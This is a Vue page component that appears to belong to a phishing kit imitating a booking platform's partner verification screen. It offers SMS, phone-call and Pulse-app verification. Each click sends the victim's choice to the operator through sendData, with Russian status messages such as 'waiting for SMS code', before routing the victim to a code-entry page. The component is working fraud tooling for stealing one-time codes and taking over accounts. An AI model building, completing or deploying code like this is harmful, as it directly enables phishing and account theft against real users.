<template>
  <div class="panel__body" id="third">
    <div class="panel__title">
      <h1>{{t('verif_pick.title')}}
      </h1>
      <div class="panel__text">
        {{t('verif_pick.description')}}
      </div>
    </div>

    <div class="next__block" id="thirdBtn">
      <div class="item" @click="next('sms')">
        <div class="next__text">
          <div class="next__icon">
            <svg width="24" height="24" style="fill:#006ce4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128">
              <path
                d="M64 16C33.1 16 8 35.7 8 60a39 39 0 0 0 14 29.1l-5.8 17.6a4 4 0 0 0 5.5 5l22-10.7a69.3 69.3 0 0 0 20.3 3c30.9 0 56-19.7 56-44S94.9 16 64 16z">
              </path>
            </svg>
          </div>
          <span class="item_text">via Text message (SMS)</span>
        </div>
        <div class="next__icon2">
          <span class="material-symbols-outlined">
            chevron_right
          </span>
        </div>

      </div>
      <div class="item" @click="next('phone')">
        <div class="next__text">
          <div class="next__icon">
            <span class="material-symbols-outlined" style="width: 20px;height: 20px">
              call
            </span>
          </div>
          <span class="item_text">via Phone call</span>
        </div>
        <div class="next__icon2">
          <span class="material-symbols-outlined">
            chevron_right
          </span>
        </div>

      </div>
      <div class="item" @click="next('pulse')" style="border:none">
        <div class="next__text">
          <div class="next__icon">
            <span>
              <svg width="20" height="20" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="240" height="240" fill="#003B95" rx="30"></rect>
                <circle cx="73" cy="183" r="15" fill="#57A6F4"></circle>
                <path fill-rule="evenodd" clip-rule="evenodd"
                  d="M83 60c0-9.941 8.059-18 18-18h63c9.941 0 18 8.059 18 18v63c0 9.941-8.059 18-18 18h-48.5c-6.667 5.5-20.6 17-23 19-3 2.5-5.5 2-7.5 1-1.6-.8-2-4.667-2-6.5V60zm27 17a8 8 0 0 1 8-8h29a8 8 0 0 1 8 8v29a8 8 0 0 1-8 8h-29a8 8 0 0 1-8-8V77z"
                  fill="#fff"></path>
              </svg>
            </span>
          </div>
          <span class="item_text">via Pulse app</span>
        </div>
        <div class="next__icon2">
          <span class="material-symbols-outlined">
            chevron_right
          </span>
        </div>

      </div>
    </div>


  </div>
</template>
<script setup>
import { sendData } from "~/utils/index.js";

const route = useRoute()
const router = useRouter()
const {t} = useI18n()

const availableVerifMethods = {
  phone: "📲 Ждет звонка",
  sms: "⏳ Ждет код SMS",
  pulse: "⏳ Ждет код Pulse"
}

async function next(verifMethod) {
  localStorage.setItem("method", verifMethod)
  await router.push({
    name: "sms-code",
    query: {
      op_token: route.query.op_token,
      method: verifMethod
    }
  })
  await sendData({ "💉 Метод верификации": availableVerifMethods[verifMethod] }, route.query.op_token)
}
</script>

<style>
#thirdBtn {
  display: flex;
  flex-direction: column;
  /* Устанавливает направление по столбцу */
  gap: 10px;
  /* Отступ между элементами */
}

.item {
  top: 0;
  left: 0;
  height: 54px;
  width: 350px;
  display: flex;
  justify-content: space-between;
  /* Выравнивание по горизонтали */
  align-items: center;
  /* Выравнивание по вертикали */
  border-bottom: 1px solid #e7e7e7;
}

.next__text {
  display: flex;
  align-items: center;
  /* Выравнивание иконки и текста по центру */
}

.item_text:hover {
  text-decoration: underline;
}

.next__icon {
  margin-right: 8px;
  /* Добавляем отступ между иконкой и текстом */
}

.next__icon2 {
  margin-left: auto;
  /* Отодвигаем элемент к правому краю */
}
</style>
